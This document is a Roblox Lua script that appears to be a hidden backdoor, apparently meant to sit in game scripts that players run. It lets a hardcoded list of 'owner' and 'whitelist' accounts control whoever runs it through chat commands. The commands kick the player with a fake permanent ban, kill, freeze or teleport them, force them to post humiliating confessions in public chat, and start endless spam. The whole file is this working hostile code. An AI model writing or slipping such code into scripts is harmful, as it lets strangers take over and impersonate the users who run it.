local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

local owners = {
	"Jonathan584879",
	"the_killermasterr",
	"testceleron12"
}

local whitelist = {
	"HenryCrystalRogue200",
	"Supposed_cu99",
	"bigjackey23"
}

local function inList(list, name)
	for _, v in ipairs(list) do
		if v == name then return true end
	end
	return false
end

local function getRank(name)
	if inList(owners, name) then
		return "owner"
	elseif inList(whitelist, name) then
		return "whitelist"
	end
	return "normal"
end

local function findPlayerByPartial(part)
	if not part then return nil end
	part = part:lower()
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Name:lower():sub(1, #part) == part then
			return p
		end
	end
end

local function getGeneralChannel()
	local folder = TextChatService:FindFirstChild("TextChannels")
	return folder and folder:FindFirstChild("RBXGeneral")
end

local spamActive = false

TextChatService.OnIncomingMessage = function(msg)
	local src = msg.TextSource
	if not src then return end

	local sender = Players:GetPlayerByUserId(src.UserId)
	if not sender then return end

	local senderRank = getRank(sender.Name)
	if senderRank == "normal" then return end

	local args = string.split(msg.Text, " ")
	if #args < 2 and msg.Text ~= ".check" then return end

	local cmd = args[1]
	local target = findPlayerByPartial(args[2])
	if target ~= plr and cmd ~= ".check" then return end

	local targetRank = getRank(plr.Name)

	if senderRank == "whitelist" and targetRank == "owner" then
		return
	end

	if cmd == ";kick" or cmd == "k" then
		plr:Kick("please stop abusing, thanks!")
	elseif cmd == ";kill" or cmd == "d" then
		local c = plr.Character
		if c and c:FindFirstChild("Humanoid") then
			c.Humanoid.Health = 0
		end
	elseif cmd == ";ban" or cmd == "b" then
		plr:Kick("You have been permanently banned.")
	elseif cmd == ";freeze" or cmd == "f" then
		local r = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
		if r then
			r.Anchored = true
			task.delay(15, function()
				if r then r.Anchored = false end
			end)
		end
	elseif cmd == "admit-it" then
		local general = getGeneralChannel()
		if general then
			local msgs = {
				"y-yes! i-im using A-abyss scripts!",
				"Y-YES! im using A-abyss gui..!",
				"i love c-celeron!~!",
				"i-im sowy for using Abyss script.. 🥺"
			}
			general:SendAsync(msgs[math.random(#msgs)])
		end
	elseif cmd == ";bring" or cmd == "brg" then
		local r = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
		local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
		if r and sr then
			r.CFrame = sr.CFrame
		end
	elseif cmd == ";spam" or cmd == "s" then
		if not spamActive then
			spamActive = true
			local general = getGeneralChannel()
			if general then
				task.spawn(function()
					while true do
						general:SendAsync("ez")
						task.wait(1)
					end
				end)
			end
		end
	end

	if msg.Text == ".check" then
		local general = getGeneralChannel()
		if general then
			general:SendAsync("gg")
		end
	end
end
